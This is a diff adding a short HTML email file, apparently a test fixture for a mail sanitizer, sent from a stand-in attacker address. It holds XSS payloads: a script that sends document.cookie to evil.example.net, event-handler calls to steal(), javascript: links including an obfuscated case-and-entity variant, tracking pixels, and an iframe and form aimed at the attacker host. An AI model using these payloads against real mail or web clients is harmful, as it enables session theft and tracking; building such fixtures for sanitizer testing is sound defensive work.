@@ -1,0 +1,18 @@
+From: mallory@attacker.example.com
+To: support@example.com
+Subject: Please read
+Date: Fri, 17 Oct 2025 08:30:00 +0700
+Message-ID: <hostile-1@attacker.example.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+
+<html><head><title>x</title><style>body{background:url(http://tracker.example.net/c.css)}</style>
+<script>fetch('http://evil.example.net/'+document.cookie)</script></head>
+<body onload="steal()"><p style="color:red" onclick="steal()">Hello <b>world</b></p>
+<a href="javascript:alert(1)">click</a> <a href="  JaVa&#x09;ScRiPt:alert(2)">click2</a>
+<a href="https://docs.example.com/page?a=1&b=2">docs</a>
+<img src="https://tracker.example.net/p.gif" onerror="steal()">
+<iframe src="https://evil.example.net/"></iframe><form action="https://evil.example.net/"><input name="x"></form>
+<svg onload="steal()"><script>steal()</script></svg>
+<!-- <script>comment()</script> -->
+</body></html>
